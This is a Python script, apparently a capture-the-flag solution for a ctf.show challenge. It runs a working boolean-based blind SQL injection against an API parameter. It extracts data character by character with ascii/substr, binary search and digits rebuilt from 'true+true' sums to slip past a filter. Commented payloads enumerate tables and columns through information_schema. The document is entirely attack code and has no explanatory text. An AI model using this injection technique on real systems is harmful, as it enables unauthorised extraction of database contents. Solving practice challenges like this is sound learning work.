import requests

url = 'http://5859a5ec-a3af-42f6-85c1-f23c06006c1c.challenge.ctf.show/api/'
flag = ''
i = 0


def numTrue(number):
    result = 'true'
    if number == 1:
        return result
    else:
        for index in range(number - 1):
            result += '+true'
        return result


while True:
    start = 32
    tail = 127
    i += 1

    while start < tail:
        mid = (start + tail) >> 1
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"
        payload = 'select concat(flagasabc) from ctfshow_flagas'
        data = {'u': f"if(ascii(substr(({payload}),{numTrue(i)},{numTrue(1)}))>{numTrue(mid)},username,'a')"}
        res = requests.get(url, params=data)
        if "userAUTO" in res.text:
            start = mid + 1
        else:
            tail = mid
    if start != 32:
        flag += chr(start)
    else:
        break
    print(flag)
